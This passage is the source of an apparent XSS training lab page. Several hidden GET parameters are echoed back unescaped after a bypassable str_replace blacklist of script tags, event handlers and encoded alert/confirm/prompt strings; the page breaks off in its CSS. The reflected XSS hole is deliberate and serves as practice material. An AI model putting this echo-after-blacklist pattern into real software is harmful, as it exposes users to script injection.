<?php
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
}
elseif(isset($_GET["id"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['id']);
    echo $re;
}
elseif(isset($_GET["cat"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['cat']);
    echo $re;
}
elseif(isset($_GET["page"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['page']);
    echo $re;
}
elseif(isset($_GET["number"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['number']);
    echo $re;
}
elseif(isset($_GET["page_id"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['page_id']);
    echo $re;
}
elseif(isset($_GET["categoryid"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['categoryid']);
    echo $re;
}
?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>KrazePlanetLabs - Advanced Hidden Parameter XSS Lab</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">

  <style>
    :root {
      --primary-dark: #1a1f36;
      --primary-light: #2d3748;
      --accent-green: #48bb78;
      --accent-blue: #4299e1;
      --accent-orange: #ed8936;
      --accent-red: #f56565;
      --accent-purple: #9f7aea;
      --accent-pink: #ed64a6;
    }
    
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #e2e8f0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .navbar-brand {
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--accent-green) !important;
    }

    .nav-link {
      font-weight: 500;
      transition: color 0.3s;
    }

    .nav-link:hover {
      color: var(--accent-green) !important;
    }

    .hero-section {
      background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                  url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
      padding: 2rem 0;
      border-bottom: 1px solid #2d3748;
      margin-bottom: 2rem;
    }

    .hero-title {
      font-size: 2rem;
      font-weight: 700;
      background: linear-gradient(90deg, #48bb78, #4299e1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 0.5rem;
    }

    .hero-subtitle {
      font-size: 1rem;
      color: #cbd5e0;
    }

    .section-title {
      margin-top: 30px;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.5rem;
      position: relative;
      padding-bottom: 10px;
    }

    .section-title::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 60px;
      height: 4px;
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border-radius: 2px;
    }

    .card {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .card-header {
      background: rgba(15, 23, 42, 0.5);
      border-bottom: 1px solid #334155;
      font-weight: 600;
      padding: 1rem 1.5rem;
    }

    .form-control {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
      padding: 0.75rem 1rem;
    }

    .form-control:focus {
      background: rgba(30, 41, 59, 0.9);
      border-color: var(--accent-green);
      box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
      color: #e2e8f0;
    }

    .form-label {
      font-weight: 500;
      color: #cbd5e0;
    }

    .btn-primary {
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border: none;
      padding: 0.75rem 1.5rem;
      font-weight: 600;
      transition: all 0.3s;
    }

    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
    }

    .search-box {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .search-box:focus {
      background: rgba(30, 41, 59, 0.9);
      border-color: var(--accent-green);
      box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
      color: #e2e8f0;
    }

    .btn-outline-success {
      border-color: var(--accent-green);
      color: var(--accent-green);
    }

    .btn-outline-success:hover {
      background-color: var(--accent-green);
      border-color: var(--accent-green);
      color: #1a202c;
    }

    pre {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1.5rem;
      color: #e2e8f0;
      border: 1px solid #334155;
      overflow-x: auto;
      max-height: 300px;
      overflow-y: auto;
    }

    .output-section {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-top: 2rem;
    }

    .output-title {
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--accent-green);
    }

    .output-content {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      min-height: 60px;
      border: 1px solid #334155;
    }

    .lab-info {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }

    .lab-badge {
      background: linear-gradient(45deg, var(--accent-pink), var(--accent-purple));
      color: white;
      font-weight: 700;
      padding: 0.5rem 1rem;
      border-radius: 6px;
      display: inline-block;
      margin-bottom: 1rem;
    }

    .filter-info {
      background: rgba(30, 41, 59, 0.7);
      border-left: 4px solid var(--accent-pink);
      padding: 1rem 1.5rem;
      margin: 1.5rem 0;
      border-radius: 0 8px 8px 0;
    }

    .code-highlight {
      color: var(--accent-orange);
      font-weight: 600;
    }

    .filter-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 0.5rem;
      margin-top: 1rem;
    }

    .filter-item {
      background: var(--accent-red);
      color: white;
      padding: 0.5rem;
      border-radius: 4px;
      text-align: center;
      font-size: 0.8rem;
      font-weight: 600;
    }

    .progress {
      height: 8px;
      background-color: #2d3748;
      margin: 1rem 0;
    }

    .progress-bar {
      background: linear-gradient(90deg, var(--accent-pink), var(--accent-purple));
    }

    .case-variations {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      border: 1px solid #334155;
    }

    .function-filter-notice {
      background: rgba(237, 100, 166, 0.1);
      border: 1px solid var(--accent-pink);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .complete-badge {
      background: linear-gradient(45deg, var(--accent-pink), var(--accent-purple), var(--accent-red));
      color: white;
      padding: 0.75rem 1.5rem;
      border-radius: 25px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: inline-block;
      margin-bottom: 1rem;
      animation: pulse-complete 2s infinite alternate;
      text-shadow: 0 0 10px rgba(237, 100, 166, 0.5);
    }

    .hidden-param-badge {
      background: linear-gradient(45deg, var(--accent-orange), var(--accent-red));
      color: white;
      padding: 0.75rem 1.5rem;
      border-radius: 25px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: inline-block;
      margin-bottom: 1rem;
      animation: pulse-hidden 2s infinite alternate;
      text-shadow: 0 0 10px rgba(237, 137, 54, 0.5);
    }

    @keyframes pulse-complete {
      0% { 
        box-shadow: 0 0 10px var(--accent-pink); 
        transform: scale(1);
      }
      100% { 
        box-shadow: 0 0 20px var(--accent-pink), 0 0 30px var(--accent-purple); 
        transform: scale(1.02);
      }
    }

    @keyframes pulse-hidden {
      0% { 
        box-shadow: 0 0 10px var(--accent-orange); 
        transform: scale(1);
      }
      100% { 
        box-shadow: 0 0 20px var(--accent-orange), 0 0 30px var(--accent-red); 
        transform: scale(1.02);
      }
    }

    .tool-tip {
      background: rgba(15, 23, 42, 0.9);
      border: 1px solid var(--accent-blue);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .arjun-tool-info {
      background: rgba(66, 153, 225, 0.1);
      border: 1px solid var(--accent-blue);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .param-badge {
      background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
      color: white;
      padding: 0.5rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      margin-right: 0.5rem;
      margin-bottom: 0.5rem;
      display: inline-block;
    }

    .encoding-badge {
      background: linear-gradient(45deg, var(--accent-pink), var(--accent-orange));
      color: white;
      padding: 0.3rem 0.7rem;
      border-radius: 4px;
      font-size: 0.7rem;
      font-weight: 600;
      margin-right: 0.3rem;
      margin-bottom: 0.3rem;
      display: inline-block;
    }

    .filtered-items {
      max-height: 200px;
